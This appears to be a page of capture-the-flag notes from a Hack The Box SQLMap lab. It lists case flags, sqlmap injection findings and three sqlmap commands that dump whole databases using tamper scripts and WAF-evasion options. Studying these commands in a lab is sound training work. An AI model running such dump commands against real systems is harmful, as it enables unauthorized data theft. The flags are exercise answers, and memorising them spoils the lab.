# Page 3

```
Case1 - HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} 

Case 2 - HTB{700_much_c0n6r475_0n_p057_r3qu357}

Case 3 - HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

Case 4 - HTB{j450n_v00rh335_53nd5_6r475}

Case 5 - HTB{700_much_r15k_bu7_w0r7h_17}

Case 6 - HTB{v1nc3_mcm4h0n_15_4570n15h3d}

Case 7 - HTB{un173_7h3_un173d}


GET parameter 'col' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 
GET parameter 'col' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 
--technique=BEUS
```

{% code overflow="wrap" %}
```
sqlmap -r case10.txt -p id -D testdb --dump-all --batch --level=2 --risk=3 --tamper=base64encode --random-agent --skip-waf
```
{% endcode %}

{% code overflow="wrap" %}
```
sqlmap -r case11.txt -p id -D testdb -T flag11 --dump-all --batch --level=2 --risk=3 --tamper=between --random-agent --skip-waf
```
{% endcode %}

{% code overflow="wrap" %}
```
sqlmap -r final01.txt -p id -D production -T final_flag --batch --level=2 --risk=3 --tamper=between --random-agent --skip-waf --dump 
```
{% endcode %}
